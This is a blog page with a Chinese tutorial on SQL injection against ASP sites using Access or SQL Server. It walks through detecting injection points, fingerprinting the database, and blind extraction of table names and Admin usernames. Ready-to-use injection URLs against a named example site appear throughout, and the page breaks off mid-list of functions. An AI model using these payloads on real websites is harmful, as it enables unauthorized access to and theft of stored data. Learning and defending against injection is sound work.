<!DOCTYPE html>
<html class="no-js" lang="en">
<head>
	<meta charset="UTF-8">
	<meta name="viewport" content="width=device-width, initial-scale=1">
	<title>最详细SQL注入教程 - 编程随想</title>
	<script>(function(d,e){d[e]=d[e].replace("no-js","js");})(document.documentElement,"className");</script>
	<meta name="description" content="">
		<meta property="og:title" content="最详细SQL注入教程" />
<meta property="og:description" content="随着B/S模式应用开发的发展，使用这种模式编写应用程序的程序员也越来越多。但是由于这个行业的入门门槛不高，程序员的水平及经验也参差不齐，相当大一部分程序员在编写代码的时候，没有对用户输入数据的合法性进行判断，使应用程序存在安全隐患。用户可以提交一段数据库查询代码，根据程序返回的结果，获得某些他想得知的数据，这就是所谓的SQL Injection，即ＳＱＬ注入。 ＳＱＬ注入是从正常的WWW端口访问，而且表面看起来跟一般的Web页面访问没什么区别，所以目前市面的防火墙都不会对ＳＱＬ注入发出警报，如果管理员没查看IIS日志的习惯，可能被入侵很长时间都不会发觉。 但是，ＳＱＬ注入的手法相当灵活，在注入的时候会碰到很多意外的情况。能不能根据具体情况进行分析，构造巧妙的SQL语句，从而成功获取想要的数据，是高手与“菜鸟”的根本区别。 根据国情，国内的网站用ASP&#43;Access或SQLServer的占70%以上，PHP&#43;MySQ占L20%，其他的不足10%。在本文，我们从分入门、进阶至高级讲解一下ASP注入的方法及技巧，PHP注入的文章由NB联盟的另一位朋友zwell撰写，希望对安全工作者和程序员都有用处。了解 ASP注入的朋友也请不要跳过入门篇，因为部分人对注入的基本判断方法还存在误区。大家准备好了吗？Let&#39;s Go... 入 门 篇 如果你以前没试过ＳＱＬ注入的话，那么第一步先把IE菜单=&gt;工具=&gt;Internet选项=&gt;高级=&gt;显示友好 HTTP 错误信息前面的勾去掉。否则，不论服务器返回什么错误，IE都只显示为HTTP 500服务器错误，不能获得更多的提示信息。 第一节、ＳＱＬ注入原理 以下我们从一个网站www.mytest.com开始（注：本文发表前已征得该站站长同意，大部分都是真实数据）
在网站首页上，有名为“IE不能打开新窗口的多种解决方法”的链接，地址为：http://www.mytest.com/showdetail.asp?id=49，我们在这个地址后面加上单引号’，服务器会返回下面的错误提示： Microsoft JET Database Engine 错误 &#39;80040e14&#39; 字符串的语法错误 在查询表达式 &#39;ID=49&#39;&#39; 中。 /showdetail.asp，行8 从这个错误提示我们能看出下面几点： 1. 网站使用的是Access数据库，通过JET引擎连接数据库，而不是通过ODBC。 2. 程序没有判断客户端提交的数据是否符合程序要求。 3. 该SQL语句所查询的表中有一名为ID的字段。 从上面的例子我们可以知道，ＳＱＬ注入的原理，就是从客户端提交特殊的代码，从而收集程序及服务器的信息，从而获取你想到得到的资料。 第二节、判断能否进行ＳＱＬ注入 看完第一节，有一些人会觉得：我也是经常这样测试能否注入的，这不是很简单吗？ 其实，这并不是最好的方法，为什么呢？ 首先，不一定每台服务器的IIS都返回具体错误提示给客户端，如果程序中加了cint(参数)之类语句的话，ＳＱＬ注入是不会成功的，但服务器同样会报错，具体提示信息为处理 URL 时服务器上出错。请和系统管理员联络。 其次，部分对ＳＱＬ注入有一点了解的程序员，认为只要把单引号过滤掉就安全了，这种情况不为少数，如果你用单引号测试，是测不到注入点的。 那么，什么样的测试方法才是比较准确呢？答案如下： ① http://www.mytest.com/showdetail.asp?id=49 ② http://www.mytest.com/showdetail.asp?id=49 ;and 1=1 ③ http://www.mytest.com/showdetail.asp?id=49 ;and 1=2 这就是经典的1=1、1=2测试法了，怎么判断呢？看看上面三个网址返回的结果就知道了： 可以注入的表现： ① 正常显示（这是必然的，不然就是程序有错误了） ② 正常显示，内容基本与①相同 ③ 提示BOF或EOF（程序没做任何判断时）、或提示找不到记录（判断了rs.eof时）、或显示内容为空（程序加了on error resume next） 不可以注入就比较容易判断了，①同样正常显示，②和③一般都会有程序定义的错误提示，或提示类型转换时出错。 当然，这只是传入参数是数字型的时候用的判断方法，实际应用的时候会有字符型和搜索型参数，我将在中级篇的“ＳＱＬ注入一般步骤”再做分析。 第三节、判断数据库类型及注入方法 不同的数据库的函数、注入方法都是有差异的，所以在注入之前，我们还要判断一下数据库的类型。一般ASP最常搭配的数据库是Access和SQLServer，网上超过99%的网站都是其中之一。 怎么让程序告诉你它使用的什么数据库呢？来看看： SQLServer有一些系统变量，如果服务器IIS提示没关闭，并且SQLServer返回错误提示的话，那可以直接从出错信息获取，方法如下： http://www." />
<meta property="og:type" content="article" />
<meta property="og:url" content="/posts/e578ffd2d7b2b67ea4d972676a3ccc09/" /><meta property="article:section" content="posts" />
<meta property="article:published_time" content="2017-10-24T11:31:07+08:00" />
<meta property="article:modified_time" content="2017-10-24T11:31:07+08:00" />


	<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
	<link rel="dns-prefetch" href="//fonts.googleapis.com">
	<link rel="dns-prefetch" href="//fonts.gstatic.com">
	<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Open+Sans:400,400i,700">

	<link rel="stylesheet" href="/css/style.css">
	

	<link rel="shortcut icon" href="/favicon.ico">
		
</head>
<body class="body">
	<div class="container container--outer">
		<header class="header">
	<div class="container header__container">
		
	<div class="logo">
		<a class="logo__link" href="/" title="编程随想" rel="home">
			<div class="logo__item logo__text">
					<div class="logo__title">编程随想</div>
					
				</div>
		</a>
	</div>
		<div class="divider"></div>
	</div>
</header>
		<div class="wrapper flex">
			<div class="primary">
			
<main class="main" role="main">
	<article class="post">
		<header class="post__header">
			<h1 class="post__title">最详细SQL注入教程</h1>
			
		</header>
		<div class="content post__content clearfix">
			
<div id="content_views" class="htmledit_views">
                    <span style='color:rgb(85,85,85); font-family:"microsoft yahei"; font-size:15px'>随着B/S模式应用开发的发展，使用这种模式编写应用程序的程序员也越来越多。但是由于这个行业的入门门槛不高，程序员的水平及经验也参差不齐，相当大一部分程序员在编写代码的时候，没有对用户输入数据的合法性进行判断，使应用程序存在安全隐患。用户可以提交一段数据库查询代码，根据程序返回的结果，获得某些他想得知的数据，这就是所谓的SQL Injection，即ＳＱＬ注入。 </span> 
<br style='color:rgb(85,85,85); font-family:"microsoft yahei"; font-size:15px'> 
<span style='color:rgb(85,85,85); font-family:"microsoft yahei"; font-size:15px'>ＳＱＬ注入是从正常的WWW端口访问，而且表面看起来跟一般的Web页面访问没什么区别，所以目前市面的防火墙都不会对ＳＱＬ注入发出警报，如果管理员没查看IIS日志的习惯，可能被入侵很长时间都不会发觉。 </span> 
<br style='color:rgb(85,85,85); font-family:"microsoft yahei"; font-size:15px'> 
<span style='color:rgb(85,85,85); font-family:"microsoft yahei"; font-size:15px'>但是，ＳＱＬ注入的手法相当灵活，在注入的时候会碰到很多意外的情况。能不能根据具体情况进行分析，构造巧妙的SQL语句，从而成功获取想要的数据，是高手与“菜鸟”的根本区别。 </span> 
<br style='color:rgb(85,85,85); font-family:"microsoft yahei"; font-size:15px'> 
<span style='color:rgb(85,85,85); font-family:"microsoft yahei"; font-size:15px'>根据国情，国内的网站用ASP+Access或SQLServer的占70%以上，PHP+MySQ占L20%，其他的不足10%。在本文，我们从分入门、进阶至高级讲解一下ASP注入的方法及技巧，PHP注入的文章由NB联盟的另一位朋友zwell撰写，希望对安全工作者和程序员都有用处。了解 ASP注入的朋友也请不要跳过入门篇，因为部分人对注入的基本判断方法还存在误区。大家准备好了吗？Let's Go... </span> 
<br style='color:rgb(85,85,85); font-family:"microsoft yahei"; font-size:15px'> 
<br style='color:rgb(85,85,85); font-family:"microsoft yahei"; font-size:15px'> 
<span style='color:rgb(85,85,85); font-family:"microsoft yahei"; font-size:18px'><strong>入 门 篇 </strong></span> 
<br style='color:rgb(85,85,85); font-family:"microsoft yahei"; font-size:15px'> 
<br style='color:rgb(85,85,85); font-family:"microsoft yahei"; font-size:15px'> 
<span style='color:rgb(85,85,85); font-family:"microsoft yahei"; font-size:15px'>如果你以前没试过ＳＱＬ注入的话，那么第一步先把IE菜单=&gt;工具=&gt;Internet选项=&gt;高级=&gt;显示友好 HTTP 错误信息前面的勾去掉。否则，不论服务器返回什么错误，IE都只显示为HTTP 500服务器错误，不能获得更多的提示信息。 </span> 
<br style='color:rgb(85,85,85); font-family:"microsoft yahei"; font-size:15px'> 
<br style='color:rgb(85,85,85); font-family:"microsoft yahei"; font-size:15px'> 
<span style='color:rgb(85,85,85); font-family:"microsoft yahei"; font-size:15px'>第一节、ＳＱＬ注入原理 </span> 
<br style='color:rgb(85,85,85); font-family:"microsoft yahei"; font-size:15px'> 
<p style='margin-top:0px; margin-bottom:0px; padding-top:0px; padding-bottom:0px; color:rgb(85,85,85); font-family:"microsoft yahei"; font-size:15px'> 以下我们从一个网站www.mytest.com开始（注：本文发表前已征得该站站长同意，大部分都是真实数据）</p> 
<span style='color:rgb(85,85,85); font-family:"microsoft yahei"; font-size:15px'>在网站首页上，有名为“IE不能打开新窗口的多种解决方法”的链接，地址为：http://www.mytest.com/showdetail.asp?id=49，我们在这个地址后面加上单引号’，服务器会返回下面的错误提示： </span> 
<br style='color:rgb(85,85,85); font-family:"microsoft yahei"; font-size:15px'> 
<p style='margin-top:0px; margin-bottom:0px; padding-top:0px; padding-bottom:0px; color:rgb(85,85,85); font-family:"microsoft yahei"; font-size:15px'> Microsoft JET Database Engine 错误 '80040e14' </p> 
<span style='color:rgb(85,85,85); font-family:"microsoft yahei"; font-size:15px'>字符串的语法错误 在查询表达式 'ID=49'' 中。 </span> 
<br style='color:rgb(85,85,85); font-family:"microsoft yahei"; font-size:15px'> 
<span style='color:rgb(85,85,85); font-family:"microsoft yahei"; font-size:15px'>/showdetail.asp，行8 </span> 
<br style='color:rgb(85,85,85); font-family:"microsoft yahei"; font-size:15px'> 
<br style='color:rgb(85,85,85); font-family:"microsoft yahei"; font-size:15px'> 
<span style='color:rgb(85,85,85); font-family:"microsoft yahei"; font-size:15px'>从这个错误提示我们能看出下面几点： </span> 
<br style='color:rgb(85,85,85); font-family:"microsoft yahei"; font-size:15px'> 
<span style='color:rgb(85,85,85); font-family:"microsoft yahei"; font-size:15px'>1. 网站使用的是Access数据库，通过JET引擎连接数据库，而不是通过ODBC。 </span> 
<br style='color:rgb(85,85,85); font-family:"microsoft yahei"; font-size:15px'> 
<span style='color:rgb(85,85,85); font-family:"microsoft yahei"; font-size:15px'>2. 程序没有判断客户端提交的数据是否符合程序要求。 </span> 
<br style='color:rgb(85,85,85); font-family:"microsoft yahei"; font-size:15px'> 
<span style='color:rgb(85,85,85); font-family:"microsoft yahei"; font-size:15px'>3. 该SQL语句所查询的表中有一名为ID的字段。 </span> 
<br style='color:rgb(85,85,85); font-family:"microsoft yahei"; font-size:15px'> 
<span style='color:rgb(85,85,85); font-family:"microsoft yahei"; font-size:15px'>从上面的例子我们可以知道，ＳＱＬ注入的原理，就是从客户端提交特殊的代码，从而收集程序及服务器的信息，从而获取你想到得到的资料。 </span> 
<br style='color:rgb(85,85,85); font-family:"microsoft yahei"; font-size:15px'> 
<br style='color:rgb(85,85,85); font-family:"microsoft yahei"; font-size:15px'> 
<span style='color:rgb(85,85,85); font-family:"microsoft yahei"; font-size:15px'>第二节、判断能否进行ＳＱＬ注入</span> 
<span style='color:rgb(85,85,85); font-family:"microsoft yahei"; font-size:15px'> </span> 
<br style='color:rgb(85,85,85); font-family:"microsoft yahei"; font-size:15px'> 
<br style='color:rgb(85,85,85); font-family:"microsoft yahei"; font-size:15px'> 
<span style='color:rgb(85,85,85); font-family:"microsoft yahei"; font-size:15px'>看完第一节，有一些人会觉得：我也是经常这样测试能否注入的，这不是很简单吗？ </span> 
<br style='color:rgb(85,85,85); font-family:"microsoft yahei"; font-size:15px'> 
<span style='color:rgb(85,85,85); font-family:"microsoft yahei"; font-size:15px'>其实，这并不是最好的方法，为什么呢？ </span> 
<br style='color:rgb(85,85,85); font-family:"microsoft yahei"; font-size:15px'> 
<span style='color:rgb(85,85,85); font-family:"microsoft yahei"; font-size:15px'>首先，不一定每台服务器的IIS都返回具体错误提示给客户端，如果程序中加了cint(参数)之类语句的话，ＳＱＬ注入是不会成功的，但服务器同样会报错，具体提示信息为处理 URL 时服务器上出错。请和系统管理员联络。 </span> 
<br style='color:rgb(85,85,85); font-family:"microsoft yahei"; font-size:15px'> 
<span style='color:rgb(85,85,85); font-family:"microsoft yahei"; font-size:15px'>其次，部分对ＳＱＬ注入有一点了解的程序员，认为只要把单引号过滤掉就安全了，这种情况不为少数，如果你用单引号测试，是测不到注入点的。</span> 
<br style='color:rgb(85,85,85); font-family:"microsoft yahei"; font-size:15px'> 
<span style='color:rgb(85,85,85); font-family:"microsoft yahei"; font-size:15px'>那么，什么样的测试方法才是比较准确呢？答案如下： </span> 
<br style='color:rgb(85,85,85); font-family:"microsoft yahei"; font-size:15px'> 
<span style='color:rgb(85,85,85); font-family:"microsoft yahei"; font-size:15px'>① http://www.mytest.com/showdetail.asp?id=49 </span> 
<br style='color:rgb(85,85,85); font-family:"microsoft yahei"; font-size:15px'> 
<span style='color:rgb(85,85,85); font-family:"microsoft yahei"; font-size:15px'>② http://www.mytest.com/showdetail.asp?id=49 ;and 1=1 </span> 
<br style='color:rgb(85,85,85); font-family:"microsoft yahei"; font-size:15px'> 
<span style='color:rgb(85,85,85); font-family:"microsoft yahei"; font-size:15px'>③ http://www.mytest.com/showdetail.asp?id=49 ;and 1=2 </span> 
<br style='color:rgb(85,85,85); font-family:"microsoft yahei"; font-size:15px'> 
<span style='color:rgb(85,85,85); font-family:"microsoft yahei"; font-size:15px'>这就是经典的1=1、1=2测试法了，怎么判断呢？看看上面三个网址返回的结果就知道了： </span> 
<br style='color:rgb(85,85,85); font-family:"microsoft yahei"; font-size:15px'> 
<span style='color:rgb(85,85,85); font-family:"microsoft yahei"; font-size:15px'>可以注入的表现： </span> 
<br style='color:rgb(85,85,85); font-family:"microsoft yahei"; font-size:15px'> 
<span style='color:rgb(85,85,85); font-family:"microsoft yahei"; font-size:15px'>① 正常显示（这是必然的，不然就是程序有错误了） </span> 
<br style='color:rgb(85,85,85); font-family:"microsoft yahei"; font-size:15px'> 
<span style='color:rgb(85,85,85); font-family:"microsoft yahei"; font-size:15px'>② 正常显示，内容基本与①相同 </span> 
<br style='color:rgb(85,85,85); font-family:"microsoft yahei"; font-size:15px'> 
<span style='color:rgb(85,85,85); font-family:"microsoft yahei"; font-size:15px'>③ 提示BOF或EOF（程序没做任何判断时）、或提示找不到记录（判断了rs.eof时）、或显示内容为空（程序加了on error resume next） </span> 
<br style='color:rgb(85,85,85); font-family:"microsoft yahei"; font-size:15px'> 
<span style='color:rgb(85,85,85); font-family:"microsoft yahei"; font-size:15px'>不可以注入就比较容易判断了，①同样正常显示，②和③一般都会有程序定义的错误提示，或提示类型转换时出错。 </span> 
<br style='color:rgb(85,85,85); font-family:"microsoft yahei"; font-size:15px'> 
<span style='color:rgb(85,85,85); font-family:"microsoft yahei"; font-size:15px'>当然，这只是传入参数是数字型的时候用的判断方法，实际应用的时候会有字符型和搜索型参数，我将在中级篇的“ＳＱＬ注入一般步骤”再做分析。 </span> 
<br style='color:rgb(85,85,85); font-family:"microsoft yahei"; font-size:15px'> 
<br style='color:rgb(85,85,85); font-family:"microsoft yahei"; font-size:15px'> 
<span style='color:rgb(85,85,85); font-family:"microsoft yahei"; font-size:15px'>第三节、判断数据库类型及注入方法 </span> 
<br style='color:rgb(85,85,85); font-family:"microsoft yahei"; font-size:15px'> 
<br style='color:rgb(85,85,85); font-family:"microsoft yahei"; font-size:15px'> 
<span style='color:rgb(85,85,85); font-family:"microsoft yahei"; font-size:15px'>不同的数据库的函数、注入方法都是有差异的，所以在注入之前，我们还要判断一下数据库的类型。一般ASP最常搭配的数据库是Access和SQLServer，网上超过99%的网站都是其中之一。 </span> 
<br style='color:rgb(85,85,85); font-family:"microsoft yahei"; font-size:15px'> 
<span style='color:rgb(85,85,85); font-family:"microsoft yahei"; font-size:15px'>怎么让程序告诉你它使用的什么数据库呢？来看看： </span> 
<br style='color:rgb(85,85,85); font-family:"microsoft yahei"; font-size:15px'> 
<span style='color:rgb(85,85,85); font-family:"microsoft yahei"; font-size:15px'>SQLServer有一些系统变量，如果服务器IIS提示没关闭，并且SQLServer返回错误提示的话，那可以直接从出错信息获取，方法如下： </span> 
<br style='color:rgb(85,85,85); font-family:"microsoft yahei"; font-size:15px'> 
<span style='color:rgb(85,85,85); font-family:"microsoft yahei"; font-size:15px'>http://www.mytest.com/showdetail.asp?id=49 ;and user&gt;0 </span> 
<br style='color:rgb(85,85,85); font-family:"microsoft yahei"; font-size:15px'> 
<span style='color:rgb(85,85,85); font-family:"microsoft yahei"; font-size:15px'>这句语句很简单，但却包含了SQLServer特有注入方法的精髓，我自己也是在一次无意的测试中发现这种效率极高的猜解方法。让我看来看看它的含义：首先，前面的语句是正常的，重点在and user&gt;0，我们知道，user是SQLServer的一个内置变量，它的值是当前连接的用户名，类型为nvarchar。拿一个 nvarchar的值跟int的数0比较，系统会先试图将nvarchar的值转成int型，当然，转的过程中肯定会出错，SQLServer的出错提示是：将nvarchar值 ”abc” 转换数据类型为 int 的列时发生语法错误，呵呵，abc正是变量user的值，这样，不废吹灰之力就拿到了数据库的用户名。在以后的篇幅里，大家会看到很多用这种方法的语句。 </span> 
<br style='color:rgb(85,85,85); font-family:"microsoft yahei"; font-size:15px'> 
<span style='color:rgb(85,85,85); font-family:"microsoft yahei"; font-size:15px'>顺便说几句，众所周知，SQLServer的用户sa是个等同Adminstrators权限的角色，拿到了sa权限，几乎肯定可以拿到主机的 Administrator了。上面的方法可以很方便的测试出是否是用sa登录，要注意的是：如果是sa登录，提示是将”dbo”转换成int的列发生错误，而不是”sa”。 </span> 
<br style='color:rgb(85,85,85); font-family:"microsoft yahei"; font-size:15px'> 
<span style='color:rgb(85,85,85); font-family:"microsoft yahei"; font-size:15px'>如果服务器IIS不允许返回错误提示，那怎么判断数据库类型呢？我们可以从Access和SQLServer和区别入手，Access和 SQLServer都有自己的系统表，比如存放数据库中所有对象的表，Access是在系统表[msysobjects]中，但在Web环境下读该表会提示“没有权限”，SQLServer是在表[sysobjects]中，在Web环境下可正常读取。 </span> 
<br style='color:rgb(85,85,85); font-family:"microsoft yahei"; font-size:15px'> 
<span style='color:rgb(85,85,85); font-family:"microsoft yahei"; font-size:15px'>在确认可以注入的情况下，使用下面的语句： </span> 
<br style='color:rgb(85,85,85); font-family:"microsoft yahei"; font-size:15px'> 
<span style='color:rgb(85,85,85); font-family:"microsoft yahei"; font-size:15px'>http://www.mytest.com/showdetail.asp?id=49 ;and (select count(*) from sysobjects)&gt;0 </span> 
<br style='color:rgb(85,85,85); font-family:"microsoft yahei"; font-size:15px'> 
<span style='color:rgb(85,85,85); font-family:"microsoft yahei"; font-size:15px'>http://www.mytest.com/showdetail.asp?id=49 ;and (select count(*) from msysobjects)&gt;0 </span> 
<br style='color:rgb(85,85,85); font-family:"microsoft yahei"; font-size:15px'> 
<span style='color:rgb(85,85,85); font-family:"microsoft yahei"; font-size:15px'>如果数据库是SQLServer，那么第一个网址的页面与原页面http://www.mytest.com/showdetail.asp?id= 49是大致相同的；而第二个网址，由于找不到表msysobjects，会提示出错，就算程序有容错处理，页面也与原页面完全不同。 </span> 
<br style='color:rgb(85,85,85); font-family:"microsoft yahei"; font-size:15px'> 
<span style='color:rgb(85,85,85); font-family:"microsoft yahei"; font-size:15px'>如果数据库用的是Access，那么情况就有所不同，第一个网址的页面与原页面完全不同；第二个网址，则视乎数据库设置是否允许读该系统表，一般来说是不允许的，所以与原网址也是完全不同。大多数情况下，用第一个网址就可以得知系统所用的数据库类型，第二个网址只作为开启IIS错误提示时的验证。 </span> 
<br style='color:rgb(85,85,85); font-family:"microsoft yahei"; font-size:15px'> 
<br style='color:rgb(85,85,85); font-family:"microsoft yahei"; font-size:15px'> 
<span style='color:rgb(85,85,85); font-family:"microsoft yahei"; font-size:18px'><strong>进 阶 篇 </strong></span> 
<br style='color:rgb(85,85,85); font-family:"microsoft yahei"; font-size:15px'> 
<br style='color:rgb(85,85,85); font-family:"microsoft yahei"; font-size:15px'> 
<span style='color:rgb(85,85,85); font-family:"microsoft yahei"; font-size:15px'>在入门篇，我们学会了ＳＱＬ注入的判断方法，但真正要拿到网站的保密内容，是远远不够的。接下来，我们就继续学习如何从数据库中获取想要获得的内容，首先，我们先看看ＳＱＬ注入的一般步骤： </span> 
<br style='color:rgb(85,85,85); font-family:"microsoft yahei"; font-size:15px'> 
<p style='margin-top:0px; margin-bottom:0px; padding-top:0px; padding-bottom:0px; color:rgb(85,85,85); font-family:"microsoft yahei"; font-size:15px'> <strong>第一节、ＳＱＬ注入的一般步骤 </strong></p> 
<span style='color:rgb(85,85,85); font-family:"microsoft yahei"; font-size:15px'>首先，判断环境，寻找注入点，判断数据库类型，这在入门篇已经讲过了。 </span> 
<br style='color:rgb(85,85,85); font-family:"microsoft yahei"; font-size:15px'> 
<span style='color:rgb(85,85,85); font-family:"microsoft yahei"; font-size:15px'>其次，根据注入参数类型，在脑海中重构SQL语句的原貌，按参数类型主要分为下面三种： </span> 
<br style='color:rgb(85,85,85); font-family:"microsoft yahei"; font-size:15px'> 
<span style='color:rgb(85,85,85); font-family:"microsoft yahei"; font-size:15px'>(A) ID=49 这类注入的参数是数字型，SQL语句原貌大致如下： </span> 
<br style='color:rgb(85,85,85); font-family:"microsoft yahei"; font-size:15px'> 
<span style='color:rgb(85,85,85); font-family:"microsoft yahei"; font-size:15px'>Select * from 表名 where 字段=49 </span> 
<br style='color:rgb(85,85,85); font-family:"microsoft yahei"; font-size:15px'> 
<span style='color:rgb(85,85,85); font-family:"microsoft yahei"; font-size:15px'>注入的参数为ID=49 And [查询条件]，即是生成语句： </span> 
<br style='color:rgb(85,85,85); font-family:"microsoft yahei"; font-size:15px'> 
<span style='color:rgb(85,85,85); font-family:"microsoft yahei"; font-size:15px'>Select * from 表名 where 字段=49 And [查询条件] </span> 
<br style='color:rgb(85,85,85); font-family:"microsoft yahei"; font-size:15px'> 
<span style='color:rgb(85,85,85); font-family:"microsoft yahei"; font-size:15px'>(B) Class=连续剧 这类注入的参数是字符型，SQL语句原貌大致概如下： </span> 
<br style='color:rgb(85,85,85); font-family:"microsoft yahei"; font-size:15px'> 
<span style='color:rgb(85,85,85); font-family:"microsoft yahei"; font-size:15px'>Select * from 表名 where 字段=’连续剧’ </span> 
<br style='color:rgb(85,85,85); font-family:"microsoft yahei"; font-size:15px'> 
<span style='color:rgb(85,85,85); font-family:"microsoft yahei"; font-size:15px'>注入的参数为Class=连续剧’ and [查询条件] and ‘’=’ ，即是生成语句： </span> 
<br style='color:rgb(85,85,85); font-family:"microsoft yahei"; font-size:15px'> 
<span style='color:rgb(85,85,85); font-family:"microsoft yahei"; font-size:15px'>Select * from 表名 where 字段=’连续剧’ and [查询条件] and ‘’=’’ </span> 
<br style='color:rgb(85,85,85); font-family:"microsoft yahei"; font-size:15px'> 
<span style='color:rgb(85,85,85); font-family:"microsoft yahei"; font-size:15px'>&amp;copy; 搜索时没过滤参数的，如keyword=关键字，SQL语句原貌大致如下： </span> 
<br style='color:rgb(85,85,85); font-family:"microsoft yahei"; font-size:15px'> 
<span style='color:rgb(85,85,85); font-family:"microsoft yahei"; font-size:15px'>Select * from 表名 where 字段like ’%关键字%’ </span> 
<br style='color:rgb(85,85,85); font-family:"microsoft yahei"; font-size:15px'> 
<span style='color:rgb(85,85,85); font-family:"microsoft yahei"; font-size:15px'>注入的参数为keyword=’ and [查询条件] and ‘%25’=’， 即是生成语句： </span> 
<br style='color:rgb(85,85,85); font-family:"microsoft yahei"; font-size:15px'> 
<span style='color:rgb(85,85,85); font-family:"microsoft yahei"; font-size:15px'>Select * from 表名 where字段like ’%’ and [查询条件] and ‘%’=’%’ </span> 
<br style='color:rgb(85,85,85); font-family:"microsoft yahei"; font-size:15px'> 
<span style='color:rgb(85,85,85); font-family:"microsoft yahei"; font-size:15px'>接着，将查询条件替换成SQL语句，猜解表名，例如： </span> 
<br style='color:rgb(85,85,85); font-family:"microsoft yahei"; font-size:15px'> 
<span style='color:rgb(85,85,85); font-family:"microsoft yahei"; font-size:15px'>ID=49 And (Select Count(*) from Admin)&gt;=0 </span> 
<br style='color:rgb(85,85,85); font-family:"microsoft yahei"; font-size:15px'> 
<span style='color:rgb(85,85,85); font-family:"microsoft yahei"; font-size:15px'>如果页面就与ID=49的相同，说明附加条件成立，即表Admin存在，反之，即不存在（请牢记这种方法）。如此循环，直至猜到表名为止。 </span> 
<br style='color:rgb(85,85,85); font-family:"microsoft yahei"; font-size:15px'> 
<span style='color:rgb(85,85,85); font-family:"microsoft yahei"; font-size:15px'>表名猜出来后，将Count(*)替换成Count(字段名)，用同样的原理猜解字段名。 </span> 
<br style='color:rgb(85,85,85); font-family:"microsoft yahei"; font-size:15px'> 
<span style='color:rgb(85,85,85); font-family:"microsoft yahei"; font-size:15px'>有人会说：这里有一些偶然的成分，如果表名起得很复杂没规律的，那根本就没得玩下去了。说得很对，这世界根本就不存在100%成功的黑客技术，苍蝇不叮无缝的蛋，无论多技术多高深的黑客，都是因为别人的程序写得不严密或使用者保密意识不够，才有得下手。 </span> 
<br style='color:rgb(85,85,85); font-family:"microsoft yahei"; font-size:15px'> 
<span style='color:rgb(85,85,85); font-family:"microsoft yahei"; font-size:15px'>有点跑题了，话说回来，对于SQLServer的库，还是有办法让程序告诉我们表名及字段名的，我们在高级篇中会做介绍。 </span> 
<br style='color:rgb(85,85,85); font-family:"microsoft yahei"; font-size:15px'> 
<span style='color:rgb(85,85,85); font-family:"microsoft yahei"; font-size:15px'>最后，在表名和列名猜解成功后，再使用SQL语句，得出字段的值，下面介绍一种最常用的方法－Ascii逐字解码法，虽然这种方法速度很慢，但肯定是可行的方法。 </span> 
<br style='color:rgb(85,85,85); font-family:"microsoft yahei"; font-size:15px'> 
<span style='color:rgb(85,85,85); font-family:"microsoft yahei"; font-size:15px'>我们举个例子，已知表Admin中存在username字段，首先，我们取第一条记录，测试长度： </span> 
<br style='color:rgb(85,85,85); font-family:"microsoft yahei"; font-size:15px'> 
<span style='color:rgb(85,85,85); font-family:"microsoft yahei"; font-size:15px'>http://www.mytest.com/showdetail.asp?id=49 ;and (select top 1 len(username) from Admin)&gt;0 </span> 
<br style='color:rgb(85,85,85); font-family:"microsoft yahei"; font-size:15px'> 
<span style='color:rgb(85,85,85); font-family:"microsoft yahei"; font-size:15px'>先说明原理：如果top 1的username长度大于0，则条件成立；接着就是&gt;1、&gt;2、&gt;3这样测试下去，一直到条件不成立为止，比如&gt;7成立，&gt;8不成立，就是len(username)=8 </span> 
<br style='color:rgb(85,85,85); font-family:"microsoft yahei"; font-size:15px'> 
<span style='color:rgb(85,85,85); font-family:"microsoft yahei"; font-size:15px'>当然没人会笨得从0,1,2,3一个个测试，怎么样才比较快就看各自发挥了。在得到username的长度后，用mid(username,N,1)截取第N位字符，再asc(mid(username,N,1))得到ASCII码，比如： </span> 
<br style='color:rgb(85,85,85); font-family:"microsoft yahei"; font-size:15px'> 
<span style='color:rgb(85,85,85); font-family:"microsoft yahei"; font-size:15px'>id=49 and (select top 1 unicode(substring(username,1,1)) from Admin)&gt;0 </span> 
<br style='color:rgb(85,85,85); font-family:"microsoft yahei"; font-size:15px'> 
<span style='color:rgb(85,85,85); font-family:"microsoft yahei"; font-size:15px'>同样也是用逐步缩小范围的方法得到第1位字符的ASCII码，注意的是英文和数字的ASCII码在1-128之间，可以用折半法加速猜解，如果写成程序测试，效率会有极大的提高。 </span> 
<br style='color:rgb(85,85,85); font-family:"microsoft yahei"; font-size:15px'> 
<br style='color:rgb(85,85,85); font-family:"microsoft yahei"; font-size:15px'> 
<span style='color:rgb(85,85,85); font-family:"microsoft yahei"; font-size:15px'>第二节、ＳＱＬ注入常用函数</span> 
<span style='color:rgb(85,85,85); font-family:"microsoft yahei"; font-size:15px'> </span> 
<br style='color:rgb(85,85,85); font-family:"microsoft yahei"; font-size:15px'> 
<br style='color:rgb(85,85,85); font-family:"microsoft yahei"; font-size:15px'> 
<span style='color:rgb(85,85,85); font-family:"microsoft yahei"; font-size:15px'>有SQL语言基础的人，在ＳＱＬ注入的时候成功率比不熟悉的人高很多。我们有必要提高一下自己的SQL水平，特别是一些常用的函数及命令。 </span> 
<br style='color:rgb(85,85,85); font-family:"microsoft yahei"; font-size:15px'> 
<span style='color:rgb(85,85,85); font-family:"microsoft yahei"; font-size:15px'>Access：asc(字符) SQLServer：unicode(字符) </span> 
<br style='color:rgb(85,85,85); font-family:"microsoft yahei"; font-size:15px'> 
<span style='color:rgb(85,85,85); font-family:"microsoft yahei"; font-size:15px'>作用：返回某字符的ASCII码 </span> 
<br style='color:rgb(85,85,85); font-family:"microsoft yahei"; font-size:15px'> 
<span style='color:rgb(85,85,85); font-family:"microsoft yahei"; font-size:15px'>Access：chr(数字) SQLServer：nchar(数字) </span> 
<br style='color:rgb(85,85,85); font-family:"microsoft yahei"; font-size:15px'> 
<span style='color:rgb(85,85,85); font-family:"microsoft yahei"; font-size:15px'>作用：与asc相反，根据ASCII码返回字符 </span> 
<br style='color:rgb(85,85,85); font-family:"microsoft yahei"; font-size:15px'> 
<span style='color:rgb(85,85,85); font-family:"microsoft yahei"; font-size:15px'>Access：mid(字符串,N,L) SQLServer：substring(字符串,N,L) </span> 
<br style='color:rgb(85,85,85); font-family:"microsoft yahei"; font-size:15px'> 
<span style='color:rgb(85,85,85); font-family:"microsoft yahei"; font-size:15px'>作用：返回字符串从N个字符起长度为L的子字符串，即N到N+L之间的字符串 </span> 
<br style='color:rgb(85,85,85); font-family:"microsoft yahei"; font-size:15px'> 
<span style='color:rgb(85,85,85); font-family:"microsoft yahei"; font-size:15px'>Access：abc(数字) SQLServer：abc (数字) </span> 
<br style='color:rgb(85,85,85); font-family:"microsoft yahei"; font-size:15px'> 
